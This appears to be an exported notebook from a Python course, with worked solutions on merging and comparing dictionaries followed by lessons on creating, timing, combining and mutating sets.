d = {'python': 17,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10,
     'go': 9,
     'erlang': 5,
     'haskell': 2,
     'pascal': 1}
```

If only servers 1 and 2 return data (so d1 and d2), your results would look like:


```
d = {'python': 16,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10, 
     'go': 9}
```

##### Solution

My approach here is to first create a combined dictionary that contains all the keys from all the dictionaries, and adds the values together if the key exists in more than one dictionary.
I do this by looping through all the dictionaries and all the items in each of those dictionaries.
You could do this instead by first getting all the keys and unioning them to create a dictionary with just the keys, but then you would still have to lookup each key in each dictionary to see if it is present - that's three lookups for each key (or as many lookups as we have input dictionaries) - I think it's probably more efficient to just take the first approach I mention.

Then in a second phase, I create a new dictionary based on the one I just created to have it sorted by the value.


```
d1 = {'python': 10, 'java': 3, 'c#': 8, 'javascript': 15}
d2 = {'java': 10, 'c++': 10, 'c#': 4, 'go': 9, 'python': 6}
d3 = {'erlang': 5, 'haskell': 2, 'python': 1, 'pascal': 1}

def merge(*dicts):
    unsorted = {}
    for d in dicts:
        for k, v in d.items():
            unsorted[k] = unsorted.get(k, 0) + v
            
    # create a dictionary sorted by value
    return dict(sorted(unsorted.items(), key=lambda e: e[1], reverse=True))
```


```
merged = merge(d1, d2, d3)
for k, v in merged.items():
    print(k, v)
```

    python 17
    javascript 15
    java 13
    c# 12
    c++ 10
    go 9
    erlang 5
    haskell 2
    pascal 1
    


```
merged = merge(d1, d2)
for k, v in merged.items():
    print(k, v)
```

    python 16
    javascript 15
    java 13
    c# 12
    c++ 10
    go 9
    

##  Coding Exercises - Solution 4

#### Exercise 4

For this exercise suppose you have a web API load balanced across multiple nodes. This API receives various requests for resources and logs each request to some local storage. Each instance of the API is able to return a dictionary containing the resource that was accessed (the dictionary key) and the number of times it was requested (the associated value).

Your task here is to identify resources that have been requested on some, but not all the servers, so you can determine if you have an issue with your load balancer not distributing certain resource requests across all nodes.

For simplicity, we will assume that there are exactly 3 nodes in the cluster.

You should write a function that takes 3 dictionaries as arguments for node 1, node 2, and node 3, and returns a dictionary that contains only keys that are not found in **all** of the dictionaries. The value should be a list containing the number of times it was requested in each node (the node order should match the dictionary (node) order passed to your function). Use `0` if the resource was not requested from the corresponding node.

Suppose your dictionaries are for logs of all the GET requests on each node:


```
n1 = {'employees': 100, 'employee': 5000, 'users': 10, 'user': 100}
n2 = {'employees': 250, 'users': 23, 'user': 230}
n3 = {'employees': 150, 'users': 4, 'login': 1000}
```

Your result should then be:


```
result = {'employee': (5000, 0, 0),
          'user': (100, 230, 0),
          'login': (0, 0, 1000)}
```

Tip: 
to find the difference between two sets, you can subtract one from the other:


```
s1 = {1, 2, 3, 4}
s2 = {1, 2, 3}
s1 - s2
```




    {4}



Tip: to get the union of two (or more) sets you can use the `|` operator:


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
s1 | s2
```




    {1, 2, 3, 4}



Tip: to get the intersection of two (or more) sets you can use the `&` operator:


```
s1 = {1, 2, 3, 4}
s2 = {2, 3}
s1 & s2
```




    {2, 3}



Hint: It might be helpful to draw out a set diagram and consider what subset you are trying to isolate.

##### Solution

The approach I am going to take here is to merge all the keys into a single set, then remove from it the intersection of all the keys (i.e. remove keys that are common to all dictionaries).
Once I have that set of keys, I will pull the frequency from each dictionary (node) and build up a list of these frequencies.


```
n1 = {'employees': 100, 'employee': 5000, 'users': 10, 'user': 100}
n2 = {'employees': 250, 'users': 23, 'user': 230}
n3 = {'employees': 150, 'users': 4, 'login': 1000}
```


```
union = n1.keys() | n2.keys() | n3.keys()
intersection = n1.keys() & n2.keys() & n3.keys()
```


```
union, intersection, union - intersection
```




    ({'employee', 'employees', 'login', 'user', 'users'},
     {'employees', 'users'},
     {'employee', 'login', 'user'})




```
def identify(node1, node2, node3):
    union = node1.keys() | node2.keys() | node3.keys()
    intersection = node1.keys() & node2.keys() & node3.keys()
    relevant = union - intersection
    result = {key: (node1.get(key, 0),
                    node2.get(key, 0),
                    node3.get(key, 0))
              for key in relevant}
    return result        
```


```
result = identify(n1, n2, n3)
for k, v in result.items():
    print(f'{k}: {v}')
```

    login: (0, 0, 1000)
    user: (100, 230, 0)
    employee: (5000, 0, 0)
    

# Section 05 - Sets

##  Creating Sets

Just like dictionaries, there is a variety of ways to create sets.

First we have set literals:


```
s = {'a', 100, (1,2)}
```


```
type(s)
```




    set



To create an empty set we cannot use `{}` since that would create an empty dictionary:


```
d = {}
type(d)
```




    dict



Instead, we have to use the `set()` function:


```
s = set()
```


```
type(s)
```




    set



This brings up the second way we can create sets. We can use the `set()` function and pass it an iterable:


```
s = set([1, 2, 3])
```


```
s
```




    {1, 2, 3}



or even:


```
s = set(range(10))
```


```
s
```




    {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}



Of course we are restricted to an iterable of hashable elements only.

So this would not work:


```
s = set([[1,2], [3,4]])
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-10-575d528523b5> in <module>
    ----> 1 s = set([[1,2], [3,4]])
    

    TypeError: unhashable type: 'list'


What might surprise you is this:


```
d = {'a': 1, 'b': 2}
s = set(d)
```

See? No exception!

But consider what happens when we iterate a dictionary:


```
for e in d:
    print(e)
```

    a
    b
    

We just get the keys back! All dictionary keys are hashable, and therefore we can always create a set from a dictionary, but it will just contain the keys:


```
s
```




    {'a', 'b'}



Next we can use a **set comprehension** to create a set. It looks and works almost the same as a dictionary comprehension - but a set, unlike a dictionary, has no associated values. 
Here's an example:


```
s = {c for c in 'python'}
```


```
s
```




    {'h', 'n', 'o', 'p', 't', 'y'}



Of course, we do not really need to use a comprehension here. Since strings are iterables of characters (which are hashable), we can create a set from the characters in a string as follows:


```
s = set('python')
s
```




    {'h', 'n', 'o', 'p', 't', 'y'}



Just like we have iterable unpacking and dictionary unpacking, we also have set unpacking:


```
s1 = {'a', 'b', 'c'}
s2 = {10, 20, 30}
```

To combine both elements of these sets, we cannot do this:


```
s = {s1, s2}
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-18-35f81208adfa> in <module>
    ----> 1 s = {s1, s2}
    

    TypeError: unhashable type: 'set'


This would be a set of sets - and sets are not hashable anyway (we could use a frozenset, but more about those later).

What we want is to unpack the elements of the sets into something else.

We could create a set containing all these elements:


```
s = {*s1, *s2}
```


```
s
```




    {10, 20, 30, 'a', 'b', 'c'}



What's interesting about the unpacking though, is that we are not restricted to just creating another set:


```
l = [*s1, *s2]
```


```
l
```




    ['b', 'a', 'c', 10, 20, 30]



or even to pass as arguments to a function - with a big caveat!


```
def my_func(a, b, c):
    print(a, b, c)
```


```
args = {20, 10, 30}
```

We cannot just pass the set directly to `my_func` because it expects three arguments, but we can unpack the set before we pass it:


```
my_func(*args)
```

    10 20 30
    

Notice the order of the arguments! As we know, order of elements in a set is considered random (it's not of course, but for all practical purposes it might as well be).

In some cases however, it might not matter.
Consider this function:


```
def averager(*args):
    total = 0
    for arg in args:
        total += arg
    return total / len(args)
```


```
averager(10, 20, 30)
```




    20.0



#### Distinct Elements

We know that set elements must be distinct - so how do all these methods we have seen for creating sets behave when we have repeated elements?

Let's take a look at each, one at a time:


```
s = {'a', 'b', 'c', 'a', 'b', 'c'}
s
```




    {'a', 'b', 'c'}



As you can see, Python just discards any repeated element.

The same happens with the `set()` function:


```
s = set('baabaa')
s
```




    {'a', 'b'}



And the same with a comprehension:


```
s = {c for c in 'moomoo'}
s
```




    {'m', 'o'}



Now unpacking is a little different. If we unpack into a set, then sure, elements will remain distinct:


```
s1 = {10, 20, 30}
s2 = {20, 30, 40}
s = {*s1, *s2}
s
```




    {10, 20, 30, 40}



But if we unpack into a tuple for example:


```
t = (*s1, *s2)
```


```
t
```




    (10, 20, 30, 40, 20, 30)



As you can see, we get repeated elements.

#### Application

So, one really interesting application of sets and the fact that their elements are unique, is finding unique elements from collections whose elements might not be.

Consider this problem. We have a string, and we want to assign a score to the string based on how many distinct characters of the alphabet it uses.

(I'm considering an alphabet here to be 'a' - 'z'). So the total length of that alphabet is 26, and we can score a string this way:


```
s = 'abcdefghijklmnopqrstuvwxyz'
distinct = set(s)
score = len(s) / 26
score
```




    1.0



Let's write a function to do this, (and remove any characters that are not part of our 'alphabet'):


```
def scorer(s):
    alphabet = set('abcdefghijklmnopqrstuvwxyz')
    s = s.lower()
    distinct = set(s)
    # we want to only count characters that are in our alphabet
    effective = distinct & alphabet
    return len(effective) / len(alphabet)
```


```
scorer(s)
```




    1.0




```
scorer('baa baa')
```




    0.07692307692307693




```
2 / 26
```




    0.07692307692307693




```
scorer('baa baa baa!!! 123')
```




    0.07692307692307693




```
scorer('the quick brown fox jumps over the lazy dog')
```




    1.0



Often we are presented with problems where we have a list, or other collection, and we just want to find the unique elements of that list.
As long as the elements are all hashable, we can easily do this using sets!

##  Common Set Operations

Let's look at some of the more basic and common operations with sets:
* size
* membership testing
* adding elements
* removing elements

#### Size

The size of a set (it's cardinality), is given by the `len()` function - the same one we use for sequences, iterables, dictionaries, etc.


```
s = {1, 2, 3}
len(s)
```




    3



#### Membership Testing

This is also very easy:


```
s = {1, 2, 3}
```


```
1 in s
```




    True




```
10 in s
```




    False




```
1 not in s
```




    False




```
10 not in s
```




    True



But let's go a little further and consider how membership testing works with sets. As I mentioned in earlier lectures, sets are hash tables, and membership testing is **extremely** efficient for sets, since it's simply a hash table lookup - as opposed to scanning a list for example, until we find the requested element (or not).

Let's do some quick timings to verify this, as well as compare lookup speeds for sets and dictionaries as well (which are also, after all, hash tables).


```
from timeit import timeit
```


```
n = 100_000
s = {i for i in range(n)}
l = [i for i in range(n)]
d = {i:None for i in range(n)}
```

Let's time how long it takes to find if `9` is in the object - which would be the tenth element only of the list and the dictionary (keys), and who knows for the set:


```
number = 1_000_000
search = 9
t_list = timeit(f'{search} in l', globals=globals(), number=number)
t_set = timeit(f'{search} in s', globals=globals(), number=number)
t_dict = timeit(f'{search} in d', globals=globals(), number=number)
print('list:', t_list)
print('set:', t_set)
print('dict:', t_dict)
```

    list: 0.09865150199038908
    set: 0.025414875999558717
    dict: 0.029280081973411143
    

The story changes even more if we test for example the last element of the list.
I'm definitely not to run the tests `1_000_000` times - not unless we want to make this video reaaaaaaly long!


```
number = 3_000
search = 99_999
t_list = timeit(f'{search} in l', globals=globals(), number=number)
t_set = timeit(f'{search} in s', globals=globals(), number=number)
t_dict = timeit(f'{search} in d', globals=globals(), number=number)
print('list:', t_list)
print('set:', t_set)
print('dict:', t_dict)
```

    list: 2.287420156993903
    set: 9.811401832848787e-05
    dict: 0.00010706903412938118
    

The situation for `not in` is the same:


```
number = 3_000
search = -1
t_list = timeit(f'{search} not in l', globals=globals(), number=number)
t_set = timeit(f'{search} not in s', globals=globals(), number=number)
t_dict = timeit(f'{search} not in d', globals=globals(), number=number)
print('list:', t_list)
print('set:', t_set)
print('dict:', t_dict)
```

    list: 2.031598252011463
    set: 7.687101606279612e-05
    dict: 7.940799696370959e-05
    

But this efficiency does come at the cost of memory:


```
print(d.__sizeof__())
print(s.__sizeof__())
print(l.__sizeof__())
```

    5242952
    4194504
    824440
    

Even for empty objects:


```
s = set()
d = dict()
l = list()
```


```
print(d.__sizeof__())
print(s.__sizeof__())
print(l.__sizeof__())
```

    216
    200
    40
    

And adding just one element to each object:


```
s.add(10)
d[10] =None
l.append(10)
```


```
print(d.__sizeof__())
print(s.__sizeof__())
print(l.__sizeof__())
```

    216
    200
    72
    

If you're wondering why the dictionary and set size did not increase, remember when we covered hash tables - there is some overallocation that takes place so we don't incure the cost of resizing every time we had an element. In fact, lists do the same as well - they over-allocate to reduce the resizing cost. I'll come back to that in a minute.

#### Adding Elements

When we have an existing set, we can always add elements to it. Of course *where* it gets "inserted" is unknown. So Python does not call it `append` or `insert` which would connotate ordering of some kind - instead it just calls it `add`:


```
s = {30, 20, 10}
```


```
s.add(15)
```


```
s
```




    {10, 15, 20, 30}



Don't be fooled by the apparent ordering of the elements here. This is the same as with dictionaries - Jupyter tries to represent things nicely for us, but underneath the scenes:


```
print(s)
```

    {10, 20, 30, 15}
    


```
s.add(-1)
print(s)
```

    {10, 15, 20, 30, -1}
    

And the order just changed again! :-)

What's interesting about the `add()` method, is that if we try to add an element that already exists, Python will simply ignore it:


```
s
```




    {-1, 10, 15, 20, 30}




```
s.add(15)
```


```
s
```




    {-1, 10, 15, 20, 30}



Now that we know how to add an element to a set, let's go back and see how  the set, dictionary and list resize as we add more elements to them.
We should expect the list to be more efficient from a memory standpoint:


```
l = list()
s = set()
d = dict()

print('#', 'dict', 'set', 'list')
for i in range(50):
    print(i, d.__sizeof__(), s.__sizeof__(), l.__sizeof__())
    l.append(i)
    s.add(i)
    d[i] = None
```

    # dict set list
    0 216 200 40
    1 216 200 72
    2 216 200 72
    3 216 200 72
    4 216 200 72
    5 216 712 104
    6 344 712 104
    7 344 712 104
    8 344 712 104
    9 344 712 168
    10 344 712 168
    11 624 712 168
    12 624 712 168
    13 624 712 168
    14 624 712 168
    15 624 712 168
    16 624 712 168
    17 624 712 240
    18 624 712 240
    19 624 712 240
    20 624 712 240
    21 624 2248 240
    22 1160 2248 240
    23 1160 2248 240
    24 1160 2248 240
    25 1160 2248 240
    26 1160 2248 320
    27 1160 2248 320
    28 1160 2248 320
    29 1160 2248 320
    30 1160 2248 320
    31 1160 2248 320
    32 1160 2248 320
    33 1160 2248 320
    34 1160 2248 320
    35 1160 2248 320
    36 1160 2248 408
    37 1160 2248 408
    38 1160 2248 408
    39 1160 2248 408
    40 1160 2248 408
    41 1160 2248 408
    42 1160 2248 408
    43 2256 2248 408
    44 2256 2248 408
    45 2256 2248 408
    46 2256 2248 408
    47 2256 2248 504
    48 2256 2248 504
    49 2256 2248 504
    

As you can see, the memory costs for a set or a dict are definitely higher than for a list. You can also see from this how it looks like CPython implements different resizing strategies for sets, dicts and lists.
The strategy by the way has nothing to do with the size of the elements we put in those objects:


```
l = list()
s = set()
d = dict()

print('#', 'dict', 'set', 'list')
for i in range(50):
    print(i, d.__sizeof__(), s.__sizeof__(), l.__sizeof__())
    l.append(i**1000)
    s.add(i*1000)
    d[i*1000] = None
```

    # dict set list
    0 216 200 40
    1 216 200 72
    2 216 200 72
    3 216 200 72
    4 216 200 72
    5 216 712 104
    6 344 712 104
    7 344 712 104
    8 344 712 104
    9 344 712 168
    10 344 712 168
    11 624 712 168
    12 624 712 168
    13 624 712 168
    14 624 712 168
    15 624 712 168
    16 624 712 168
    17 624 712 240
    18 624 712 240
    19 624 712 240
    20 624 712 240
    21 624 2248 240
    22 1160 2248 240
    23 1160 2248 240
    24 1160 2248 240
    25 1160 2248 240
    26 1160 2248 320
    27 1160 2248 320
    28 1160 2248 320
    29 1160 2248 320
    30 1160 2248 320
    31 1160 2248 320
    32 1160 2248 320
    33 1160 2248 320
    34 1160 2248 320
    35 1160 2248 320
    36 1160 2248 408
    37 1160 2248 408
    38 1160 2248 408
    39 1160 2248 408
    40 1160 2248 408
    41 1160 2248 408
    42 1160 2248 408
    43 2256 2248 408
    44 2256 2248 408
    45 2256 2248 408
    46 2256 2248 408
    47 2256 2248 504
    48 2256 2248 504
    49 2256 2248 504
    

As you can see the memory cost of the objects themselves did not change, nor did the sizing strategy (remember that all those objects contain pointers to the data, not the data itself - and a pointer to an object, no matter the size of that object, is the same).
So be careful using `__sizeof__` - it's often only part of the story.

#### Removing Elements

Now let's see how we can remove elements from a set.

Just as with dictionaries, we may be trying to remove an item that does not exist in the set. Depending on whether we want to silently ignore deletion of non-existent elements we can use one of two techniques:


```
s = {1, 2, 3}
```


```
s.remove(1)
```


```
s
```




    {2, 3}




```
s.remove(10)
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-30-23b5f1bb77c8> in <module>
    ----> 1 s.remove(10)
    

    KeyError: 10


As you can see, we get an exception.

If we don't want the exception we can do it this way:


```
s.discard(10)
```


```
s
```




    {2, 3}



We can also remove (and return) an **arbitrary** element from the set:


```
s = set('python')
```


```
s
```




    {'h', 'n', 'o', 'p', 't', 'y'}




```
s.pop()
```




    'h'



Note that we **do not know** ahead of time what element will get popped.

Also, popping an empty set will result in a `KeyError` exception:


```
s = set()
s.pop()
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-36-261aed8e48a7> in <module>
          1 s = set()
    ----> 2 s.pop()
    

    KeyError: 'pop from an empty set'


Something like that might be handy to handle all the elements of a set one at a time without caring for the order in which elements are removed from the set - not that you can, anyway - sets are not ordered!
But this way you can get at the elements of a set without knowing the content of the set (since you need to know the element you are removing with `remove` and `discard`.)

Finally, you can empty out a set by calling the `clear` method:


```
s = {1, 2, 3}
s.clear()
s
```




    set()



##  Set Operations

Let's go over the set operations that are available in Python.

##### Intersections

There's two ways to calculate the intersection of sets:


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
```


```
s1.intersection(s2)
```




    {2, 3}




```
s1 & s2
```




    {2, 3}



We can computer the intersection of more than just two sets at a time:


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
s3 = {3, 4, 5}
```


```
s1.intersection(s2, s3)
```




    {3}




```
s1 & s2 & s3
```




    {3}



##### Unions

There's also two ways to calculate the union of two sets:


```
s1 = {1, 2, 3}
s2 = {3, 4, 5}
```


```
s1.union(s2)
```




    {1, 2, 3, 4, 5}




```
s1 | s2
```




    {1, 2, 3, 4, 5}



We can compute the union of more than two sets:


```
s3 = {5, 6, 7}
```


```
s1.union(s2, s3)
```




    {1, 2, 3, 4, 5, 6, 7}




```
s1 | s2 | s3
```




    {1, 2, 3, 4, 5, 6, 7}



##### Disjointedness

Two sets are disjoint if their intersection is empty:


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
s3 = {30, 40, 50}
```


```
print(s1.isdisjoint(s2))
print(s2.isdisjoint(s3))
```

    False
    True
    

Of course we could use the cardinality of the intersection instead:


```
len(s1 & s2)
```




    2




```
len(s2 & s3)
```




    0



Or, since empty sets are falsy:


```
bool(set())
```




    False




```
bool({0})
```




    True



we can also use the associated truth value:


```
if {1, 2} & {2, 3}:
    print('sets are not disjoint')
```

    sets are not disjoint
    


```
if not {1, 2} & {3, 4}:
    print('sets are disjoint')
```

    sets are disjoint
    

##### Differences

The difference of two sets can also be computed in two different ways:


```
s1 = {1, 2, 3, 4, 5}
s2 = {4, 5}
```


```
s1 - s2
```




    {1, 2, 3}




```
s1.difference(s2)
```




    {1, 2, 3}



Of course, with the method we can use iterables as well:


```
s1.difference([4, 5])
```




    {1, 2, 3}



Note that the difference operator is not commutative, i.e. it does not hold in general that
```
s1 - s2 = s2 - s1
```


```
s2 - s1
```




    set()



##### Symmetric Difference

We can calculate the symmetirc difference of two sets also in two ways:


```
s1 = {1, 2, 3, 4, 5}
s2 = {4, 5, 6, 7, 8}
```


```
s1.symmetric_difference(s2)
```




    {1, 2, 3, 6, 7, 8}




```
s1 ^ s2
```




    {1, 2, 3, 6, 7, 8}



Remember that the symmetric difference of two sets results in the difference of the union and the intersection of the two sets:


```
(s1 | s2) - (s1 & s2)
```




    {1, 2, 3, 6, 7, 8}



##### Subsets and Supersets

With containmnent we have the notion of proper containment (i.e strictly contained, not equal) and just containment (contained, possibly equal).
This is analogous to the concept of (`i < j` and `i <= j`)


```
s1 = {1, 2, 3}
s2 = {1, 2, 3}
s3 = {1, 2, 3, 4}
s4 = {10, 20, 30}
```


```
s1.issubset(s2)
```




    True




```
s1 <= s2
```




    True



For strict containment there is no set method - we have to use the operator, or a combination of methods/operators:


```
s1 < s2
```




    False




```
s1.issubset(s2) and s1 != s2
```




    False




```
s1 < s3
```




    True




```
s1 <= s4
```




    False



An analogous situation with supersets:


```
s2.issuperset(s1)
```




    True




```
s2 >= s1
```




    True




```
s2 > s1
```




    False



Be careful with these set containment operators, they do not work quite the same way as with numbers for example:

With numbers, if
```
a <= b --> False
```
then it follows that
```
a < b --> True
```

This is not the case with set containment:


```
s1 = {1, 2, 3}
s2 = {10, 20, 30}
```

As you can see these two sets are non-empty and disjoint, and containment works as follows:


```
s1 <= s2
```




    False




```
s1 > s2
```




    False




```
s1 < s2
```




    False




```
s1 >= s2
```




    False




```
s1 == s2
```




    False



There's really not a whole lot more to say about the various set operations themselves - they are quite easy.
Where they really shine is in their application to diverse problems, especially when dealing with dictionary keys as we saw earlier.

##### Enhanced Set Methods

There's a slight wrinkle to some of these operations we just saw.

When we use the operators (`&`, `|`, `-`) we have to deal with sets on both sides of the operator:


```
{1, 2} & [2, 3]
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-46-af2dd925c03f> in <module>
    ----> 1 {1, 2} & [2, 3]
    

    TypeError: unsupported operand type(s) for &: 'set' and 'list'


But when we work with the method equivalent, we do not have that restriction - in fact the argument to these methods can be an iterable in general, not just a set:


```
{1, 2}.intersection([2, 3])
```




    {2}



What happens is that Python implicitly converts any iterable to a set then finds the intersection.

However, these iterables must contain hashable elements - they need not be unique (they will eventually be made to consist of unique elements):


```
{1, 2}.intersection([[1,2]])
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-48-4aebabd4c6c0> in <module>
    ----> 1 {1, 2}.intersection([[1,2]])
    

    TypeError: unhashable type: 'list'


This means that when we want to find the intersection of two `lists` for example, we could proceed this way:


```
l1 = [1, 2, 3]
l2 = [2, 3, 4]
```


```
set(l1).intersection(l2)
```




    {2, 3}



##### Side Note: Why the choice of `&`, `|` , `^` for unions, intersections and symmetric differences?

You might be wondering why Python chose those particular symbols.

Python also uses these operators for bitwise manipulation.

`&` and `|` seem like a perfectly natural fit when you consider that
```
s1 & s2
```
means the elements that belong to `s1` **and** `s2`, 

and
```
s1 | s2
```
means the elements that belong to `s1` **or** `s2`.

Let's look at the bitwise operations:

Let's look at these two integers:


```
a = 0b101010
b = 0b110100
```


```
a, b
```




    (42, 52)



And these are just two integers, we just chose to create them using a binary literal:


```
type(a), type(b)
```




    (int, int)



Now consider that `1` means `True`, and `0` means `False`:
* `1 and 0` or `1 & 0` --> `0`
* `1 or 0` or `1 | 0` --> `1`
* and so on

Let's use the bitwise Python and (`&`) operator on those two numbers:


```
c = a & b
print(c)
```

    32
    

What we really need to do is look at the representation of this result:


```
bin(c)
```




    '0b100000'



So this is the result:
```
1 0 1 0 1 0
1 1 0 1 0 0
-----------
1 0 0 0 0 0
```

As you can see we performed a bitwise `and` between the two values. Very similar to asking whether `1` is in the intersection of corresponding slots.

The same happens with `|`, the bitwise `or` operator and unions:


```
c = a | b
```


```
bin(c)
```




    '0b111110'



And again, looking at the bits themselves:
```
1 0 1 0 1 0
1 1 0 1 0 0
-----------
1 1 1 1 1 0
```

this is like asking whether `1` is in the union of corresponding slots

Now for the symmetric difference.
There is another boolean algebra operation called `xor`, denoted by `^`.
This one works this way:
```
x xor y --> True if x is True or y is True, but not both
```



```
print(bin(a))
print(bin(b))
print(bin(a^b))
```

    0b101010
    0b110100
    0b11110
    

Let's see the bits again:
```
1 0 1 0 1 0
1 1 0 1 0 0
-----------
0 1 1 1 1 1
```

If we make two corresponding slots into sets and find the symmetric difference between the two, what do we get?


```
{1} ^ {1}
```




    set()




```
{0} ^ {1}
```




    {0, 1}




```
{0} ^ {0}
```




    set()



So we can ask if `1` is in `{0} ^ {1}` - which is exactly what the bitwise `xor` (`^`) operator evaluates to in the above example.

##  Update Operations

We can't really update an element of a set - either we remove one or add one - but replacement would not make sense, much like "replacing" a key in a dictionary (we can replace a value, just not a key, and sets are basically like value-less dictionaries).

Let's first consider how we can create new sets from other sets:

* intersection
* union
* difference
* symetric difference

For each of these cases, we can create new sets as follows:


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
print(s1, id(s1))
s1 = s1 & s2
print(s1, id(s1))
```

    {1, 2, 3} 4526218152
    {2, 3} 4526218376
    

As you can see, we calculated the intersection of `s1` and `s2` and set `s1` to the result - but this means we ended up with a new object for `s1`.

We may want to **mutate** `s1` instead.
And the samew goes for the other operations mentioned above.

Python provides us a way to do this using both methods and equivalent operators:

* union updates: `s1.update(s2)` or `s1 |= s2`
* intersection updates: `s1.intersection_update(s2)` or `s1 &= s2`
* difference updates: `s1.difference_update(s2)` or `s1 -= s2`
* symm. diff. updates: `s1.symmetric_difference_update(s2)` or `s1 ^= s2`

All these operations **mutate** the original set.

#### Union Updates


```
s1 = {1, 2, 3}
s2 = {4, 5, 6}
print(id(s1))
s1 |= s2
print(s1, id(s1))
```

    4522075080
    {1, 2, 3, 4, 5, 6} 4522075080
    


```
s1 = {1, 2, 3}
s2 = {4, 5, 6}
print(id(s1))
s1.update(s2)
print(s1, id(s1))
```

    4526218152
    {1, 2, 3, 4, 5, 6} 4526218152
    

#### Intersection Updates


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
print(id(s1))
s1 &= s2
print(s1, id(s1))
```

    4522075080
    {2, 3} 4522075080
    


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
print(id(s1))
s1.intersection_update(s2)
print(s1, id(s1))
```

    4526218152
    {2, 3} 4526218152
    

#### Difference Updates


```
s1 = {1, 2, 3, 4}
s2 = {2, 3}
print(id(s1))
s1 -= s2
print(s1, id(s1))
```

    4526218376
    {1, 4} 4526218376
    


```
s1 = {1, 2, 3, 4}
s2 = {2, 3}
print(id(s1))
s1.difference_update(s2)
print(s1, id(s1))
```

    4522074856
    {1, 4} 4522074856
    

Be careful with this one. These two expressions are **NOT** equivalent (this is because difference operations are not associative):


```
s1 = {1, 2, 3, 4}
s2 = {2, 3}
s3 = {3, 4}
result = s1 - (s2 - s3)
print(result)
s1 -= s2 - s3
print(s1)
```

    {1, 3, 4}
    {1, 3, 4}
    


```
s1 = {1, 2, 3, 4}
s2 = {2, 3}
s3 = {3, 4}
result = (s1 - s2) - s3
print(result)
s1.difference_update(s2, s3)
print(s1)
```

    {1}
    {1}
    

#### Symmetric Difference Update


```
s1 = {1, 2, 3, 4, 5}
s2 = {4, 5, 6, 7}
s1 ^ s2
```




    {1, 2, 3, 6, 7}




```
s1 = {1, 2, 3, 4, 5}
s2 = {4, 5, 6, 7}
print(id(s1))
s1 ^= s2
print(s1, id(s1))
```

    4526217704
    {1, 2, 3, 6, 7} 4526217704
    


```
s1 = {1, 2, 3, 4, 5}
s2 = {4, 5, 6, 7}
print(id(s1))
s1.symmetric_difference_update(s2)
print(s1, id(s1))
```

    4526218824
    {1, 2, 3, 6, 7} 4526218824
    

#### Why the methods as well as the operators?

The methods are actually a bit more flexible than the operators.
What happens when we want to update a set from it's union with multiple other sets?
We can certainly do it this way:


```
s1 = {1, 2, 3}
s2 = {3, 4, 5}
s3 = {5, 6, 7}
```


```
print(id(s1))
s1 |= s2 | s3
print(s1, id(s1))
```

    4522074856
    {1, 2, 3, 4, 5, 6, 7} 4522074856
    

So this works quite well, but we **have** to use sets.

Using the method we do not have that restriction, we can actually use iterables (they must contain hashable elements) and Python will implicitly convert them to sets:


```
s1 = {1, 2, 3}
s1.update([3, 4, 5], (6, 7, 8), 'abc')
print(s1)
```

    {1, 2, 3, 4, 5, 6, 7, 8, 'a', 'b', 'c'}
    

Of course we can achieve the same thing using the operators, it just requires a little more typing:


```
s1 = {1, 2, 3}
s1 |= set([3, 4, 5]) | set((6, 7, 8)) | set('abc')
print(s1)
```

    {1, 2, 3, 4, 5, 6, 7, 8, 'a', 'b', 'c'}
    

#### Where might this be useful?

You're hopefully seeing a parallel between these set mutation operations and list mutation operations such as `append` and `extend`.

So the usefullness of mutating a set is no different than the usefullness of mutating a list.

There might be a reason you want to maintain the same object reference - maybe you are writing a function that needs to mutate some set that was passed as an argument.

##### Example 1

Suppose you are writing a function that needs to return all the words found in multiple strings, but with certain words removed (like `'the'`, `'and'`, etc).

You could take this approach:


```
def combine(string, target):
    target.update(string.split(' '))
```


```
def cleanup(combined):
    words = {'the', 'and', 'a', 'or', 'is', 'of'}
    combined -= words
```


```
result = set()
combine('lumberjacks sleep all night', result)
combine('the mistry of silly walks', result)
combine('this parrot is a late parrot', result)
cleanup(result)
print(result)
```

    {'parrot', 'this', 'walks', 'mistry', 'late', 'lumberjacks', 'night', 'silly', 'sleep', 'all'}
    

##### Example 2

You may find the above example a little contrived, so let's see another example which might actually prove more practical.

Suppose we have a program that fetches data from some API, database, whatever - and it retrieves a paged list of city names. We want our program to keep fetching data from the source until the source is exhausted, and filter out any cities we are not interested in from our final result.

To simulate the data source, let's do this:


```
def gen_read_data():
    yield ['Paris', 'Beijing', 'New York', 'London', 'Madrid', 'Mumbai']
    yield ['Hyderabad', 'New York', 'Milan', 'Phoenix', 'Berlin', 'Cairo']
    yield ['Stockholm', 'Cairo', 'Paris', 'Barcelona', 'San Francisco']
```

And we can use this generator this way:


```
data = gen_read_data()
```


```
next(data)
```




    ['Paris', 'Beijing', 'New York', 'London', 'Madrid', 'Mumbai']




```
next(data)
```




    ['Hyderabad', 'New York', 'Milan', 'Phoenix', 'Berlin', 'Cairo']




```
next(data)
```




    ['Stockholm', 'Cairo', 'Paris', 'Barcelona', 'San Francisco']




```
next(data)
```


    ---------------------------------------------------------------------------

    StopIteration                             Traceback (most recent call last)

    <ipython-input-25-8ad47eec7ca3> in <module>
    ----> 1 next(data)
    

    StopIteration: 


Next we're going to create a filter that will look at the data just received, removing any cities that match one we want to ignore:


```
def filter_incoming(*cities, data_set):
    data_set.difference_update(cities)
```


```
result = set()
data = gen_read_data()
for page in data:
    result.update(page)
    filter_incoming('Paris', 'London', data_set=result)
print(result)
```

    {'Hyderabad', 'New York', 'Phoenix', 'San Francisco', 'Barcelona', 'Mumbai', 'Stockholm', 'Cairo', 'Madrid', 'Milan', 'Beijing', 'Berlin'}
    

##  Copying Sets

